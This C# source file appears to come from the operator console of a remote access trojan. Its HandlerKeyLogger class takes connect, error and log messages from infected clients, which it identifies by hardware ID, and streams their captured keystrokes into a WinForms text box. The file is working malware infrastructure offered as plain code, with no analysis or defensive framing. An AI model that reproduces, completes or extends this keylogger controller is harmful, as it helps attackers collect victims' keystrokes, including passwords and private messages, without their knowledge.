using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerKeyLogger
{
	public static void Read(Clients client, object[] objects)
	{
		switch ((string)objects[1])
		{
		case "Connect":
		{
			FormKeyLogger form3 = (FormKeyLogger)Application.OpenForms["KeyLogger:" + (string)objects[2]];
			if (form3 == null)
			{
				client.Disconnect();
				break;
			}
			form3.Invoke((MethodInvoker)delegate
			{
				form3.Text = "KeyLogger [" + (string)objects[2] + "]";
				form3.client = client;
				form3.richTextBox1.Enabled = true;
			});
			client.Tag = form3;
			client.Hwid = (string)objects[2];
			break;
		}
		case "Error":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormKeyLogger form2 = (FormKeyLogger)client.Tag;
			form2.Invoke((MethodInvoker)delegate
			{
				RichTextBox richTextBox = form2.richTextBox1;
				richTextBox.Text = richTextBox.Text + "Error: " + (string)objects[2] + "\n";
			});
			break;
		}
		case "Log":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormKeyLogger form = (FormKeyLogger)client.Tag;
			form.Invoke((MethodInvoker)delegate
			{
				form.richTextBox1.Text += (string)objects[2];
				form.richTextBox1.SelectionStart = form.richTextBox1.Text.Length;
				form.richTextBox1.ScrollToCaret();
			});
			break;
		}
		}
	}
}
